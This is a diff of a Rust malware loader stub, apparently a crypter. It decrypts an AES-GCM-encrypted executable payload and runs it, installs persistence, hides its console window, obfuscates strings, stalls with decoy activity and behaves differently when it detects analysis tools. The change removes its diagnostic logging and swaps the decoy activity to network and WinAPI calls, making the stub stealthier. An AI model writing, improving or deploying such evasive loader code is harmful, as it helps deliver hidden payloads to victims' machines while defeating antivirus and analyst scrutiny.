@@ -1,8 +1,7 @@
 #![windows_subsystem = "windows"] // Uncomment to link as a GUI-subsystem PE (no console window) 
 mod generated;
 mod persistence;
-mod logger;
-use generated::{KEY, NONCE, DELAY_SECS, VERBOSE, ANALYSIS_DETECTION};
+use generated::{KEY, NONCE, DELAY_SECS, ANALYSIS_DETECTION};
 use std::error::Error;
 use::std::time::{Duration, Instant};
 use aes_gcm::{
@@ -45,10 +44,6 @@ fn decrypt(ciphertext: &[u8]) -> Result<Vec<u8>, String> {
     let nonce: &Nonce<_> = (&NONCE).try_into().map_err(|_| "invalid nonce length")?;
     let plaintext = cipher.decrypt(nonce, ciphertext).map_err(|e| format!("AES-GCM decrypt failed: {:?}", e))?;
 
-    if VERBOSE {
-        logger::log_info(obfstr!("Binary decrypted successfully."));
-    }
-
     Ok(plaintext)
 }
 
@@ -63,7 +58,7 @@ fn execute(pe_bytes: &[u8]) -> Result<(), Box<dyn Error>> {
 fn behavior_misleading(duration_secs: u64) {
     let target = Duration::from_secs(duration_secs);
     let start = Instant::now();
-    let worker = BusyWork::new(Intensity::Low).allow(Categories::COMPUTE | Categories::MEMORY);
+    let worker = BusyWork::new(Intensity::Low).allow(Categories::NETWORK | Categories::WINAPI);
 
     while start.elapsed() < target {
         worker.run();
@@ -72,9 +67,6 @@ fn behavior_misleading(duration_secs: u64) {
 
 fn delay_execution() {
     if DELAY_SECS > 0 {
-        if VERBOSE {
-            logger::log_info(&format!("{} {} seconds...", obfstr!("Delaying execution by"), DELAY_SECS));
-        }
         behavior_misleading(DELAY_SECS);
     }
 }
@@ -104,9 +96,6 @@ fn run() -> Result<(), Box<dyn Error>> {
         // If install failed (no APPDATA, permissions, etc.), fall through
         // and run the payload normally. The stub still works, it just
         // won't persist.
-        if VERBOSE {
-            logger::log_error(obfstr!("persistence install failed, running payload only"));
-        }
     }
 
     // ---------------------------------------------------------------
@@ -115,9 +104,6 @@ fn run() -> Result<(), Box<dyn Error>> {
     delay_execution();
 
     if ANALYSIS_DETECTION && analysis_detected() {
-        if VERBOSE {
-            logger::log_info(obfstr!("analysis detected. changing behavior..."));
-        }
         behavior_misleading(rand::rng().random_range(60..120));
         return Ok(());
     }
@@ -132,9 +118,6 @@ fn run() -> Result<(), Box<dyn Error>> {
 
 fn main() {
     if let Err(error) = run() {
-        if VERBOSE {
-            logger::log_error(&format!("Error: {error}"));
-        }
         std::process::exit(1);
     }
 }
